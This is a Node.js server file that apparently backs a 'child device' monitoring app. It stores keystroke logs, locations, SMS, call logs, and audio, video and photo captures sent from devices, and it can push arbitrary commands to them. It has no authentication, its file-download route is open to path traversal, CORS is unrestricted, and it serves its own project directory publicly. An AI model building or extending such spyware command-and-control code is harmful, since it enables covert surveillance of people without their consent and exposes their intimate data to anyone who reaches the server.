const WebSocket = require("ws");
const express = require("express");
const path = require("path");
const fs = require("fs");
const bodyParser = require("body-parser");
const cors = require("cors");

const app = express();
const wss = new WebSocket.Server({ port: 8080 });
const storageDir = path.join(__dirname, "storage", "child_device_001");

if (!fs.existsSync(storageDir)) {
  fs.mkdirSync(storageDir, { recursive: true });
}

// Middleware
app.use(cors());
app.use(bodyParser.json());

// <-- REMOVE OR COMMENT OUT THIS LINE entirely! -->
// app.use(express.static(path.join(__dirname, 'public')));

// Serve static React files (index.html, js, css)
app.use(express.static(__dirname));

// WebSocket handling
wss.on("connection", (ws) => {
  console.log("Child device connected");
  ws.on("message", (message) => {
    try {
      const parsed = JSON.parse(message);
      console.log("Received:", parsed);
      const { deviceId, dataType, data, timestamp } = parsed;

      if (["keylog", "location", "sms", "call_log"].includes(dataType)) {
        const logFile = path.join(storageDir, `${dataType}.json`);
        let logs = [];
        if (fs.existsSync(logFile)) {
          logs = JSON.parse(fs.readFileSync(logFile));
        }
        logs.push({ deviceId, dataType, data, timestamp });
        fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));
      } else if (["audio", "video", "image"].includes(dataType)) {
        console.log(`Received ${dataType} file path: ${data}`);
        // handle file upload logic here
        if (
          dataType === "audio" ||
          dataType === "video" ||
          dataType === "image"
        ) {
          const extension =
            dataType === "audio"
              ? ".opus"
              : dataType === "video"
              ? ".mp4"
              : ".jpg";
          const filePath = path.join(
            storageDir,
            `${dataType}_${timestamp}${extension}`
          );
          fs.writeFileSync(filePath, Buffer.from(data.data, "base64"));
          console.log(`Saved ${dataType} to ${filePath}`);
        }
      }
    } catch (e) {
      console.error("Error processing message:", e);
    }
  });

  ws.on("close", () => console.log("Child device disconnected"));
});

app.get("/api/storage", (req, res) => {
  try {
    const files = fs.readdirSync(storageDir).map((file) => ({
      name: file,
      path: `/storage/${file}`,
      size: fs.statSync(path.join(storageDir, file)).size,
      type: file.endsWith(".json")
        ? "log"
        : file.endsWith(".opus")
        ? "audio"
        : file.endsWith(".mp4")
        ? "video"
        : "image",
    }));
    res.json(files);
  } catch (e) {
    res.status(500).json({ error: "Failed to list storage" });
  }
});

app.get("/storage/:filename", (req, res) => {
  const filePath = path.join(storageDir, req.params.filename);
  if (fs.existsSync(filePath)) {
    res.download(filePath);
  } else {
    res.status(404).json({ error: "File not found" });
  }
});

app.post("/api/command", (req, res) => {
  const { command } = req.body;
  if (!command) {
    return res.status(400).json({ error: "Command required" });
  }
  wss.clients.forEach((client) => {
    if (client.readyState === WebSocket.OPEN) {
      client.send(JSON.stringify({ command }));
      console.log(`Sent command: ${command}`);
    }
  });
  res.json({ status: "Command sent" });
});

// React catch-all route
app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.listen(8000, () => {
  console.log("Server running on http://localhost:8000");
});
